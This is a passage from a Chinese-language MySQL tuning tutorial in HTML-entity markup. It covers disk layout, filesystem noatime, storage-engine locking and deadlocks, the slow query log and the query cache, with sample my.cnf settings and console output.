&#x6280;&#x672F;&#xFF1A;RAID0&#x6216;RAID10<br>SSD<br>15000&#x8F6C;&#x3001;RAID5&#x3001;RAID10 &#x3001;SSD<br>swap &#x5206;&#x533A;&#xFF1A;&#x6700;&#x597D;&#x4F7F;&#x7528; RAID0 &#x6216; SSD<br>&#x78C1;&#x76D8;&#x5206;&#x533A;&#xFF1A;&#x5C06;&#x6570;&#x636E;&#x5E93;&#x76EE;&#x5F55;&#x653E;&#x5230;&#x4E00;&#x4E2A;&#x5206;&#x533A;&#x4E0A;&#x6216;&#x4E00;&#x4E2A;&#x78C1;&#x76D8;&#x4E0A;&#x7684;&#x7269;&#x7406;&#x5206;&#x533A;&#xFF0C;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x786C;&#x76D8;&#x6216;&#x5206;&#x533A;&#x548C;&#x7CFB;&#x7EDF;&#x6240;&#x5728;&#x7684;&#x786C;&#x76D8;&#x5206;&#x5F00;&#x3002;  </p><p>&#x8BBE;&#x7F6E;&#x4E3B;&#x4ECE;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;binlog&#x65E5;&#x5FD7;&#x9891;&#x7E41;&#x8BB0;&#x5F55;&#x64CD;&#x4F5C;&#xFF0C;&#x5F00;&#x9500;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x628A;binlog&#x65E5;&#x5FD7;&#x653E;&#x5230;&#x5176;&#x5B83;&#x786C;&#x76D8;&#x5206;&#x533A;&#x4E0A;&#xFF1A;  </p><p>#vim /etc/my.cnf<br>[mysqld]<br>datadir=/data/  #&#x653E;&#x5728;&#x72EC;&#x7ACB;&#x7684;&#x786C;&#x76D8;&#x4E0A;SSD<br>socket=/var/lib/mysql/mysql.sock<br>user=mysql<br># Disabling symbolic-links is recommended to prevent assorted security risks<br>symbolic-links=0  </p><p>#&#x5728;&#x539F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6DFB;&#x52A0;&#x4EE5;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;<br>log-bin=mysql-bin-master #&#x542F;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;<br>server-id=1 #&#x672C;&#x673A;&#x6570;&#x636E;&#x5E93;ID &#x6807;&#x793A;<br>binlog-do-db=db #&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;  </p><h3 id="4-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;"><a href="#4-&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;" class="headerlink" title="4.&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;"></a>4.&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;</h3><p>&#x7F51;&#x5361; bonding &#x6280;&#x672F;<br>&#x8BBE;&#x7F6E;tcp &#x8FDE;&#x63A5;&#x6570;&#x91CF;&#x9650;&#x5236;&#xFF0C;&#x4F18;&#x5316;&#x7CFB;&#x7EDF;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x7684;&#x6700;&#x5927;&#x9650;&#x5236;&#x3002;<br>&#x4F7F;&#x7528;64&#x4F4D;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;64&#x4F4D;&#x7CFB;&#x7EDF;&#x53EF;&#x4EE5;&#x5206;&#x7ED9;&#x5355;&#x4E2A;&#x8FDB;&#x7A0B;&#x66F4;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x8BA1;&#x7B97;&#x66F4;&#x5FEB; &#x3002;<br>&#x7981;&#x7528;&#x4E0D;&#x5FC5;&#x8981;&#x542F;&#x52A8;&#x7684;&#x670D;&#x52A1;&#x3002;<br>&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x8C03;&#x4F18;&#xFF0C;&#x7ED9;&#x6570;&#x636E;&#x4ED3;&#x5E93;&#x4E00;&#x4E2A;&#x5355;&#x72EC;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#xFF0C;&#x63A8;&#x8350;&#x4F7F;&#x7528;XFS&#xFF0C;&#x4E00;&#x822C;&#x6548;&#x7387;&#x66F4;&#x9AD8;&#x3001;&#x66F4;&#x53EF;&#x9760;&#x3002;<br>ext3 &#x4E0D;&#x9519;&#xFF0C;ext4 &#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x8FC7;&#x6E21;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;<br>&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5728;&#x6302;&#x8F7D;&#x5206;&#x533A;&#x65F6;&#x542F;&#x7528; noatime &#x9009;&#x9879;&#x3002; #&#x4E0D;&#x8BB0;&#x5F55;&#x8BBF;&#x95EE;&#x65F6;&#x95F4;<br>&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219;:<br>                         1&#xFF09;   &#x5B89;&#x88C5;&#x7CFB;&#x7EDF;&#x6700;&#x5C0F;&#x5316;<br>                         2&#xFF09;   &#x5F00;&#x542F;&#x7A0B;&#x5E8F;&#x670D;&#x52A1;&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219;<br>                         3&#xFF09;   &#x64CD;&#x4F5C;&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219;<br>                         4&#xFF09;   &#x767B;&#x5F55;&#x6700;&#x5C0F;&#x5316;&#x539F;&#x5219;<br>                         5&#xFF09;   &#x6743;&#x9650;&#x6700;&#x5C0F;&#x5316;  </p><p>&#x4F8B;&#xFF1A;&#x5173;&#x6389;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;atime&#x9009;&#x9879;  </p><pre><code class="shell">[root@jaking ~]# vim /etc/fstab #&#x5728;&#x6302;&#x8F7D;&#x9879;&#x4E2D;&#x6DFB;&#x52A0;noatime&#x9009;&#x9879;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002; UUID=46cb104c-e4dc-4f84-8afc-552f21279c65 /boot t4 defaults,noatime 1 2[root@jaking ~]# mount #&#x67E5;&#x770B;&#x6DFB;&#x52A0;&#x524D;mount&#x6302;&#x8F7D;&#x9009;&#x9879;/dev/sda1 on /boot type ext4 (rw) # &#x4F7F;&#x8BBE;&#x7F6E;&#x7ACB;&#x5373;&#x751F;&#x6548;&#xFF0C;&#x53EF;&#x8FD0;&#x884C;&#xFF1A; [root@jaking ~]# mount -o remount /boot/ [root@jaking ~]# mount /dev/sda1 on /boot type ext4 (rw,noatime) </code></pre><p>&#x8FD9;&#x6837;&#x4EE5;&#x540E;&#x7CFB;&#x7EDF;&#x5728;&#x8BFB;&#x6B64;&#x5206;&#x533A;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x5C06;&#x4E0D;&#x4F1A;&#x518D;&#x4FEE;&#x6539;atime&#x5C5E;&#x6027;&#x3002;<br>&#x8BF4;&#x660E;&#xFF1A;&#x6D4B;&#x8BD5;&#x6548;&#x679C;&#xFF0C;&#x7ED3;&#x679C;&#x6CA1;&#x6709;&#x592A;&#x5927;&#x7684;&#x610F;&#x4E49;&#x3002;</p><h3 id="5-MySQL-&#x670D;&#x52A1;&#x4F18;&#x5316;&#xFF08;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x4F18;&#x5316;"><a href="#5-MySQL-&#x670D;&#x52A1;&#x4F18;&#x5316;&#xFF08;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x4F18;&#x5316;" class="headerlink" title="5. MySQL &#x670D;&#x52A1;&#x4F18;&#x5316;&#xFF08;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x4F18;&#x5316;)"></a>5. MySQL &#x670D;&#x52A1;&#x4F18;&#x5316;&#xFF08;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x4F18;&#x5316;)</h3><p>&#x4FDD;&#x6301;&#x6BCF;&#x4E2A;&#x8868;&#x90FD;&#x4E0D;&#x8981;&#x592A;&#x5927;&#xFF0C;&#x53EF;&#x4EE5;&#x5BF9;&#x5927;&#x8868;&#x505A;&#x6A2A;&#x5207;&#x548C;&#x7EB5;&#x5207;&#xFF1A;&#x6BD4;&#x5982;&#x8BF4;&#x6211;&#x8981;&#x53D6;&#x5F97;&#x67D0; ID &#x7684; lastlog&#xFF0C; &#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x5F20;&#x53EA;&#x6709;&#x201C;ID&#x548C; &#x201C;lastlog&#x201D;&#x7684;&#x5C0F;&#x8868;&#xFF0C;&#x800C;&#x975E;&#x51E0;&#x5341;&#x3001;&#x51E0;&#x767E;&#x5217;&#x6570;&#x636E;&#x7684;&#x5E76;&#x6392;&#x5927;;&#x53E6;&#x5916;&#x5BF9;&#x4E00;&#x4E2A;&#x6709; 1000 &#x4E07;&#x6761;&#x8BB0;&#x5F55;&#x7684;&#x8868;&#x505A;&#x66F4;&#x65B0;&#x6BD4;&#x5BF9; 10 &#x4E2A; 100 &#x4E07;&#x8BB0;&#x5F55;&#x7684;&#x8868;&#x505A;&#x66F4;&#x65B0;&#x4E00;&#x822C;&#x6765;&#x5F97;&#x8981;&#x6162;&#x3002;  </p><p><strong>&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#xFF1A;</strong> </p><p>MyISAM &#x5F15;&#x64CE;&#xFF0C;&#x8868;&#x7EA7;&#x9501;&#xFF0C;&#x8868;&#x7EA7;&#x9501;&#x5F00;&#x9500;&#x5C0F;&#xFF0C;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x5927;&#xFF0C;&#x9002;&#x5408;&#x8BFB;&#x591A;&#x5199;&#x5C11;&#x7684;&#x8868;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x4E8B;&#x52A1;&#xFF0C;&#x8868;&#x9501;&#x5B9A;&#x4E0D;&#x5B58;&#x5728;&#x6B7B;&#x9501; &#xFF08;&#x4E5F;&#x6709;&#x4F8B;&#x5916;&#xFF09;  </p><p>Innodb &#x5F15;&#x64CE;&#xFF0C;&#x884C;&#x7EA7;&#x9501;&#xFF0C;&#x9501;&#x5B9A;&#x884C;&#x7684;&#x5F00;&#x9500;&#x8981;&#x6BD4;&#x9501;&#x5B9A;&#x5168;&#x8868;&#x8981;&#x5927;&#x3002;&#x5F71;&#x54CD;&#x8303;&#x56F4;&#x5C0F;&#xFF0C;&#x9002;&#x5408;&#x5199;&#x64CD;&#x4F5C;&#x6BD4;&#x8F83;&#x9891;&#x7E41;&#x7684;&#x6570;&#x636E;&#x8868;&#x3002;&#x884C;&#x7EA7;&#x9501;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x6B7B;&#x9501;  </p><p>MySQL&#x7684;&#x9501;&#x673A;&#x5236;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5176;&#x6700;&#x663E;&#x8457;&#x7684;&#x7279;&#x70B9;&#x662F;&#x4E0D;&#x540C;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x652F;&#x6301;&#x4E0D;&#x540C;&#x7684;&#x9501;&#x673A;&#x5236;  </p><p>&#x6240;&#x8C13;&#x6B7B;&#x9501;&#xFF1A;&#x662F;&#x6307;&#x4E24;&#x4E2A;&#x6216;&#x4E24;&#x4E2A;&#x4EE5;&#x4E0A;&#x7684;&#x8FDB;&#x7A0B;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;,&#x56E0;&#x4E89;&#x593A;&#x8D44;&#x6E90;&#x800C;&#x9020;&#x6210;&#x7684;&#x4E00;&#x79CD;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#x7684;&#x73B0;&#x8C61;,&#x82E5;&#x65E0;&#x5916;&#x529B;&#x4F5C;&#x7528;&#xFF0C;&#x5B83;&#x4EEC;&#x90FD;&#x5C06;&#x65E0;&#x6CD5;&#x63A8;&#x8FDB;&#x4E0B;&#x53BB;&#xFF0C;&#x6B64;&#x65F6;&#x79F0;&#x7CFB;&#x7EDF;&#x5904;&#x4E8E;&#x6B7B;&#x9501;&#x72B6;&#x6001;&#x6216;&#x7CFB;&#x7EDF;&#x4EA7;&#x751F;&#x4E86;&#x6B7B;&#x9501;&#xFF0C;&#x8FD9;&#x4E9B;&#x6C38;&#x8FDC;&#x5728;&#x4E92;&#x76F8;&#x7B49;&#x5F85;&#x7684;&#x8FDB;&#x7A0B;&#x79F0;&#x4E3A;&#x6B7B;&#x9501;&#x8FDB;&#x7A0B;&#x3002;&#x8868;&#x7EA7;&#x9501;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x6B7B;&#x9501;&#xFF0C;&#x6240;&#x4EE5;&#x89E3;&#x51B3;&#x6B7B;&#x9501;&#x4E3B;&#x8981;&#x8FD8;&#x662F;&#x9488;&#x5BF9;&#x4E8E;&#x6700;&#x5E38;&#x7528;&#x7684;InnoDB  </p><p>&#x4E4B;&#x6240;&#x4EE5;&#x51FA;&#x73B0;&#x6B7B;&#x9501;&#xFF0C;&#x662F;&#x56E0;&#x4E3A;&#x591A;&#x7EBF;&#x7A0B;&#x5BF9;&#x8D44;&#x6E90;&#x7684;&#x5F3A;&#x5360;&#xFF0C;&#x4F60;&#x8981;&#x6211;&#x7684;&#xFF0C;&#x6211;&#x4E5F;&#x8981;&#x4F60;&#x7684;&#xFF0C;&#x4E24;&#x4EBA;&#x5835;&#x5728;&#x8DEF;&#x4E0A;&#x8C01;&#x90FD;&#x4E0D;&#x8BA9;&#xFF0C;&#x6240;&#x4EE5;&#x6B7B;&#x9501;&#x4E86;  </p><p>#&#x5F00;&#x542F;&#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x540E;&#x4F1A;&#x5C06;&#x6240;&#x6709;&#x7684;&#x6B7B;&#x9501;&#x8BB0;&#x5F55;&#x5230;mysqld.log&#x4E2D; &#x9519;&#x8BEF;&#x65E5;&#x5FD7;&#x5728;my.cnf&#x914D;&#x7F6E;&#x4E3A; </p><pre><code>log-error=/data/mysql/mysqld.loginnodb_print_all_deadlocks = 1innodb_sort_buffer_size = 16M</code></pre><p>&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x767B;&#x5F55;mysql  </p><pre><code class="sql">mysql&gt; show status; #&#x770B;&#x7CFB;&#x7EDF;&#x7684;&#x72B6;&#x6001;mysql&gt; show engine innodb status \G #&#x663E;&#x793A; InnoDB &#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x7684;&#x72B6;&#x6001;mysql&gt; show variables; #&#x770B;&#x53D8;&#x91CF;</code></pre><p>&#x67E5;&#x770B;&#x8B66;&#x544A;&#x4FE1;&#x606F;&#xFF1A; </p><pre><code class="sql">mysql&gt; show warnings; #&#x67E5;&#x770B;&#x6700;&#x8FD1;&#x4E00;&#x4E2A; sql &#x8BED;&#x53E5;&#x4EA7;&#x751F;&#x7684;&#x9519;&#x8BEF;&#x8B66;&#x544A;</code></pre><p>&#x4F8B;&#xFF1A;&#x67E5;&#x770B;&#x8B66;&#x544A;&#x4FE1;&#x606F;  </p><pre><code class="sql">mysql&gt; adadfs; -- &#x968F;&#x4FBF;&#x8F93;&#x5165;&#x4E00;&#x4E9B;&#x5185;&#x5BB9;&#xFF0C;&#x56DE;&#x8F66;&#xFF0C;&#x5C06;&#x770B;&#x5230;&#x4EE5;&#x4E0B;&#x4E00;&#x4E9B;&#x9519;&#x8BEF;&#x4FE1;&#x606F; ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;adadfs&apos; at line 1 mysql&gt; show warnings; mysql&gt; show processlist ; -- &#x663E;&#x793A;mysql&#x7CFB;&#x7EDF;&#x4E2D;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;&#x6240;&#x6709;&#x7EBF;&#x7A0B;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6BCF;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x6B63;&#x5728;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4; -- &#x672C;&#x8BED;&#x53E5;TCP/IP&#x8FDE;&#x63A5;&#x7684;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#xFF08;&#x91C7;&#x7528;host_name:client_port&#x683C;&#x5F0F;&#xFF09;&#xFF0C;&#x4EE5;&#x65B9;&#x4FBF;&#x5730;&#x5224;&#x5B9A;&#x54EA;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x6B63;&#x5728;&#x505A;&#x4EC0;&#x4E48;mysql&gt; show processlist ;+----+------+-----------+------+---------+------+----------+------------------+| Id | User | Host      | db   | Command | Time | State    | Info             |+----+------+-----------+------+---------+------+----------+------------------+|  4 | root | localhost | NULL | Query   |    0 | starting | show processlist |+----+------+-----------+------+---------+------+----------+------------------+1 row in set (0.00 sec)</code></pre><p>&#x542F;&#x7528; MySQL &#x6162;&#x67E5;&#x8BE2;&#xFF1A;&#x2014;&#x5206;&#x6790; sql &#x8BED;&#x53E5;&#xFF0C;&#x627E;&#x5230;&#x5F71;&#x54CD;&#x6548;&#x7387;&#x7684; SQL  </p><pre><code class="shell">[root@jaking ~]# vim /etc/my.cnf [mysqld] slow_query_log=1  #&#x5F00;&#x542F;&#x6162;&#x67E5;&#x8BE2;&#x65E5;&#x5FD7;slow-query-log-file=/data/mysql/slow.log  #mysql &#x7528;&#x6237;&#x5BF9;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x5177;&#x6709;&#x53EF;&#x5199;&#x6743;&#x9650; long_query_time=5  #&#x67E5;&#x8BE2;&#x8D85;&#x8FC7; 5 &#x79D2;&#x949F;&#x7684;&#x8BED;&#x53E5;&#x8BB0;&#x5F55;&#x4E0B;&#x6765;log-queries-not-using-indexes=1  #&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x7684;&#x67E5;&#x8BE2;</code></pre><p>&#x8FD9;&#x4E09;&#x4E2A;&#x8BBE;&#x7F6E;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x53EF;&#x4EE5;&#x8BB0;&#x5F55;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x8D85;&#x8FC7;5 &#x79D2;&#x548C;&#x6CA1;&#x6709;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x7684;&#x67E5;&#x8BE2;&#xFF1B;&#x8BF7;&#x6CE8;&#x610F;&#x6709;&#x5173;log-queries-not-using-indexes&#x7684;&#x8B66;&#x544A;&#xFF1B;&#x6162;&#x901F;&#x67E5;&#x8BE2;&#x65E5;&#x5FD7;&#x90FD;&#x4FDD;&#x5B58;&#x5728;/data/mysql/slow.log</p><pre><code class="shell">[root@jaking ~]# systemctl restart mysqld[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.19-log Source distributionCopyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">mysql&gt; drop database testdb;Query OK, 12 rows affected (0.01 sec)mysql&gt; create database testdb;Query OK, 1 row affected (0.00 sec)mysql&gt; use testdb;Database changedmysql&gt; create table test (id int,name varchar(20));Query OK, 0 rows affected (0.00 sec)mysql&gt; insert into test values (1,&apos;man&apos;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from test;+------+------+| id   | name |+------+------+|    1 | man  |+------+------+1 row in set (0.00 sec)</code></pre><p><strong>&#x67E5;&#x770B;slow.log</strong>  </p><pre><code class="shell">[root@jaking ~]# tail -f /data/mysql/slow.log /usr/local/mysql57/bin/mysqld, Version: 5.7.19-log (Source distribution). started with:Tcp port: 3306  Unix socket: /data/mysql/mysql.sockTime                 Id Command    Argument# Time: 2021-05-15T11:36:01.644259Z# User@Host: root[root] @ localhost []  Id:     3# Query_time: 0.000150  Lock_time: 0.000062 Rows_sent: 1  Rows_examined: 1use testdb;SET timestamp=1621078561;select * from test;</code></pre><h3 id="6-my-cnf-&#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;"><a href="#6-my-cnf-&#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;" class="headerlink" title="6. my.cnf &#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;"></a>6. my.cnf &#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;</h3><p><strong>&#x4F18;&#x5316;&#x603B;&#x539F;&#x5219;&#xFF1A;</strong><br>&#x7ED9; mysql &#x7684;&#x8D44;&#x6E90;&#x592A;&#x5C11;&#xFF0C;&#x5219; mysql &#x65BD;&#x5C55;&#x4E0D;&#x5F00;&#xFF1A;&#x7ED9; mysql &#x7684;&#x8D44;&#x6E90;&#x592A;&#x591A;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x62D6;&#x7D2F;&#x6574;&#x4E2A; OS 40%&#x8D44;&#x6E90;&#x7ED9;OS&#xFF0C; 60%-70% &#x7ED9;mysql &#xFF08;&#x5185;&#x5B58;&#x548C;CPU&#xFF09;  </p><p><strong>&#x5BF9;&#x67E5;&#x8BE2;&#x8FDB;&#x884C;&#x7F13;&#x5B58;</strong><br>&#x5927;&#x591A;&#x6570;LAMP&#x5E94;&#x7528;&#x90FD;&#x4E25;&#x91CD;&#x4F9D;&#x8D56;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#xFF0C;&#x67E5;&#x8BE2;&#x7684;&#x5927;&#x81F4;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;:<br>PHP&#x53D1;&#x51FA;&#x67E5;&#x8BE2;&#x8BF7;&#x6C42;-&gt;&#x6570;&#x636E;&#x5E93;&#x6536;&#x5230;&#x6307;&#x4EE4;&#x5BF9;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x8FDB;&#x884C;&#x5206;&#x6790;-&gt;&#x786E;&#x5B9A;&#x5982;&#x4F55;&#x67E5;&#x8BE2;-&gt;&#x4ECE;&#x78C1;&#x76D8;&#x4E2D;&#x52A0;&#x8F7D;&#x4FE1;&#x606F;-&gt;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;<br>&#x5982;&#x679C;&#x53CD;&#x590D;&#x67E5;&#x8BE2;&#xFF0C;&#x5C31;&#x53CD;&#x590D;&#x6267;&#x884C;&#x8FD9;&#x4E9B;&#x6307;&#x4EE4;&#xFF1B;MySQL &#x6709;&#x4E00;&#x4E2A;&#x7279;&#x6027;&#x79F0;&#x4E3A;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x4FDD;&#x5B58;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x5728;&#x5F88;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8FD9;&#x4F1A;&#x6781;&#x5927;&#x5730;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#xFF1B;&#x4E0D;&#x8FC7;&#xFF0C;&#x95EE;&#x9898;&#x662F;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x5728;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x7981;&#x7528;&#x7684;&#x3002;  </p><p><strong>&#x542F;&#x52A8;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#xFF1A;</strong>  </p><pre><code class="shell">vim /etc/my.cnf &#x6DFB;&#x52A0;&#xFF1A; [mysqld] #&#x5728;&#x6B64;&#x5B57;&#x6BB5;&#x4E2D;&#x6DFB;&#x52A0; query_cache_size = 32M </code></pre><p>&#x67E5;&#x770B;&#xFF1A;&#x67E5;&#x8BE2;&#x7F13;&#x5B58; </p><pre><code class="shell">[root@jaking ~]# systemctl restart mysqld[root@jaking ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.19-log Source distributionCopyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.</code></pre><pre><code class="sql">mysql&gt; show status like &apos;qcache%&apos;;+-------------------------+----------+| Variable_name           | Value    |+-------------------------+----------+| Qcache_free_blocks      | 1        || Qcache_free_memory      | 33537320 || Qcache_hits             | 0        || Qcache_inserts          | 0        || Qcache_lowmem_prunes    | 0        || Qcache_not_cached       | 1        || Qcache_queries_in_cache | 0        || Qcache_total_blocks     | 1        |+-------------------------+----------+8 rows in set (0.00 sec)</code></pre><p>&#x89E3;&#x91CA;&#x5982;&#x4E0B;&#xFF1A; </p><table><thead><tr><th>&#x53D8;&#x91CF;&#x540D;</th><th>&#x8BF4;&#x660E;</th><th>&#x5907;&#x6CE8;</th></tr></thead><tbody><tr><td>Qcache_free_blocks</td><td>&#x7F13;&#x5B58;&#x4E2D;&#x76F8;&#x90BB;&#x5185;&#x5B58;&#x5757;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x6570;&#x76EE;&#x5927;&#x8BF4;&#x660E;&#x53EF;&#x80FD;&#x6709;&#x788E;&#x7247;</td><td>&#x5982;&#x679C;&#x6570;&#x76EE;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;<code>flush query cache;</code>&#x5BF9;&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x788E;&#x7247;&#x8FDB;&#x884C;&#x6574;&#x7406;&#xFF0C;&#x4ECE;&#x800C;&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x7A7A;&#x95F2;&#x5757;</td></tr><tr><td>Qcache_free_memory</td><td>&#x7F13;&#x5B58;&#x4E2D;&#x7684;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#x5927;&#x5C0F;</td></tr><tr><td>Qcache_hits</td><td>&#x6BCF;&#x6B21;&#x67E5;&#x8BE2;&#x5728;&#x7F13;&#x5B58;&#x4E2D;&#x547D;&#x4E2D;&#x65F6;&#x5C31;&#x589E;&#x5927;</td></tr><tr><td>Qcache_inserts</td><td>&#x6BCF;&#x6B21;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x65F6;&#x5C31;&#x589E;&#x5927;&#xFF0C;&#x5373;&#x6CA1;&#x6709;&#x4ECE;&#x7F13;&#x5B58;&#x4E2D;&#x627E;&#x5230;&#x6570;&#x636E;</td></tr><tr><td>Qcache_lowmem_prunes</td><td>&#x56E0;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#x5220;&#x9664;&#x7F13;&#x5B58;&#x6B21;&#x6570;&#xFF0C;&#x7F13;&#x5B58;&#x51FA;&#x73B0;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#x5E76;&#x4E14;&#x5FC5;&#x987B;&#x8981;&#x8FDB;&#x884C;&#x6E05;&#x7406;,&#x4EE5;&#x4FBF;&#x4E3A;&#x66F4;&#x591A;&#x67E5;&#x8BE2;&#x63D0;&#x4F9B;&#x7A7A;&#x95F4;&#x7684;&#x6B21;&#x6570;&#x3002;&#x8FD9;&#x4E2A;&#x6570;&#x5B57;&#x6700;&#x597D;&#x957F;&#x65F6;&#x95F4;&#x6765;&#x770B;&#xFF0C;&#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x6570;&#x5B57;&#x5728;&#x4E0D;&#x65AD;&#x589E;&#x957F;&#xFF0C;&#x5C31;&#x8868;&#x793A;&#x53EF;&#x80FD;&#x788E;&#x7247;&#x975E;&#x5E38;&#x4E25;&#x91CD;&#xFF0C;&#x6216;&#x8005;&#x7F13;&#x5B58;&#x5185;&#x5B58;&#x5F88;&#x5C11;  &#x5982;&#x679C;Qcache_free_blocks&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x8BF4;&#x660E;&#x788E;&#x7247;&#x4E25;&#x91CD;&#xFF1B;&#x5982;&#x679C; free_memory 